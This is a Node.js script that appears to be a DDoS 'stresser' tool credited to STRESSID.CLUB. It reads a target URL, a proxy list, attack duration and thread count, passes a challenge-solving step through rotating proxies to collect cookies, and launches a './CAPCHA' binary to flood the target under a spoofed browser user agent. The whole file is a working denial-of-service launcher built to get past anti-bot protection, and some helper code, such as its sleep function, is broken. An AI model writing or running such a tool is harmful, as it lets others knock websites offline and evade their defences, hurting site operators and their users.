require('events').EventEmitter.defaultMaxListeners = 0;
const { spawn } = require('child_process');

const { solving } = require('./index');

const fs = require('fs');

const theuseragent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/84.0.4316.21';

const useradmin = [
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 OPR/84.0.4316.21",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36",
];

//const theuseragent = useradmin[Math.floor(Math.random() * useradmin.length)];
if (process.argv.length < 8) {
    console.log('\x1b[35m%s\x1b[0m', 'OWNER: STRESSID.CLUB ');
    console.log('\x1b[35m%s\x1b[0m', 'node browser.js URL PROXY TIME THREADS GET RATELIMIT');
    process.exit(0);
}

function sleep(ms) {
    return new Promise(resolve => setTimeout(1200000, ms));
}

async function main() {

    const target_url = process.argv[2];
	const target = target_url.split('""')[0];
    const proxyFile = process.argv[3];
    const timeforattack = process.argv[4];
    const browsernum = process.argv[5];
    const method = process.argv[6];
    const reqperip = process.argv[7];
    const isattackstart = new Map();

    var session = [];
    
    const proxies = await fs.readFileSync(proxyFile, 'utf-8').toString().replace(/\r/g, '').split('\n').filter(word => word.trim().length > 0);

    Array.prototype.remove = function () {
        var what, a = arguments, L = a.length, ax;
        while (L && this.length) {
            what = a[--L];
            while ((ax = this.indexOf(what)) !== -1) {
                this.splice(ax, 1);
            }
        }
        return this;
    };

    function randomProxies() {
        const whois = proxies[Math.floor(Math.random() * proxies.length)];
        proxies.remove(whois)
        return whois;
    }


    async function createSession(){
        const randed = randomProxies();
        solving({
            "url":target,
            "proxy":randed
        }).then((cookie,ua) => {
            let myString = "";
            let laa_ = JSON.stringify(cookie);
            laa_ = JSON.parse(laa_);
            laa_.forEach((value) => {
                const valueString = value.name + "=" + value.value + ";";
                myString += valueString;
            });
            console.log(`\033[1;92mAttack Started`)
			console.log(`\033[1;93m[INFO] Target: ${target}`)
			console.log(`\033[1;93m[INFO] Cookie: ${myString}`)
			console.log(`\033[1;93m[INFO] User-Agent: ${theuseragent}`)
			start(target,timeforattack,browsernum,theuseragent,myString,method,reqperip,randed);
            session.push({
                "myString":myString,
                "method":method,
                "reqperip":reqperip,
                "randed":randed
            })
        }).catch((ee) => {
            console.log(ee);
            setTimeout(() => {
                createSession();
            },20000);
        })
    }


    for (let i = 0; i < browsernum; i++) {
        setTimeout(() => {
            createSession();
        },(200 * Math.floor(Math.random() * 20)))
    }	
}
main();

function start(target,timeforattack,browsernum,theuseragent,myString,method,reqperip,randed) {
    return new Promise((res,rej) => {
        const ls = spawn('./CAPCHA', [target, theuseragent, timeforattack, myString, "GET", reqperip,randed]);
        ls.stdout.on('data', (data) => {     
            return res();
        });
    })
}


